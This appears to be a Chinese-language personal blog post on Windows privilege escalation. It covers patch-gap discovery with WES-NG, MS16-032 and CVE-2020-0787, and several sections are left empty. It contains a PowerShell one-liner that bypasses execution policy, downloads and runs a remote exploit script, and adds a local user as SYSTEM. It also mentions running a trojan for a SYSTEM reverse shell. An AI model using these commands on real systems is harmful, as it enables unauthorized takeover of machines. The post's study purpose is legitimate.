---
title: Windows内网域渗透 提权
abbrlink: e80ed6fe
date: 2022-10-20 19:00:47
tags:
---

# 低权限寻找提权手段

常见的提权手段：

1、本地溢出漏洞

2、数据库提权

3、第三方软件提权

想要提权我们就需要先了解这台电脑上面究竟有什么漏洞可供我们利用，所以第一件事还是通过信息收集来找到我们可以利用的漏洞，这里有一些可以帮助我们的脚本

## 寻找提权漏洞

### Windows Exploit Suggester - Next Generation (WES-NG)

[脚本链接](https://github.com/bitsadmin/wesng)

这个脚本可以通过计算机的系统信息来看到电脑的补丁信息，进而推断出当前机器可被利用的漏洞

获取信息的方式有三种

> There are two options to check for missing patches: a. Launch `missingkbs.vbs` on the host to have Windows determine which patches are missing b. Use Windows' built-in `systeminfo.exe` tool to obtain the system information of the local system, or from a remote system using `systeminfo /S MyRemoteHost`, and redirect this to a file: `systeminfo > systeminfo.txt`
>
> 有两个选项可以检查缺失的补丁：在主机上启动`missingkbs.vbs`，让 Windows 确定缺少哪些补丁 b.使用Windows内置的`systeminfo.exe`工具获取本地系统的系统信息，或者使用`systeminfo /S MyRemoteHost`从远程系统获取系统信息，并将其重定向到一个文件：`systeminfo > systeminfo.txt`

获取到的信息放到文件中传入脚本执行即可看到结果

![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202009074.png)

## 提权脚本大全











### 溢出漏洞提权

#### MS16-032提权

通过这个漏洞我们可以以一个普通用户身份，来添加一个administrator管理员组的用户，还能以SYSTEM权限来运行程序

漏洞前提：目标系统需要有2个以上的CPU核心，并且PowerShell是2.0以上的版本

此漏洞影响Windows Vista到Windows10之间的所有未修复设备

首先找到对应的[提权脚本](https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1)，按教程来说直接运行就好，但是我本机环境尝试了好多遍都没有反应，打开报错后发现是因为原始状态下限制了powershell执行脚本，在我想如何不使用管理员权限修改powershell控制时，发现了另一种执行脚本的方法

```cmd
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'"
```

这样执行的话就不会提示需要权限并且命令也能正常执行，这还有个小坑，就是在adduser的时候一定要保证密码是能通过安全性验证的，不然没有新用户生成很容易误认为提权失败

我们也可以直接执行木马文件，这样反弹的shell就是SYSTEM用户权限了

![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202320685.png)

### 本地提权漏洞

#### CVE-2020-0787

当Windows背景智能传输服务（BITS）没有正确处理符号链接时，存在特权提升漏洞，利用后攻击者可以改写目标文件来提升权限，利用条件就是攻击者需要登录系统，可以运行EXP

该漏洞影响的版本：Windows7 SP1-Windows10 1903所有架构

在利用时我们要先看目标机器是否有对应漏洞补丁

```
systeminfo | findstr KB4540673
```

![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202332882.png)

很好，没有对应的补丁，我们直接利用对应的EXP，上传后执行（mlgbd为什么不弹！！！！！！！！！！！！）





### 数据库提权









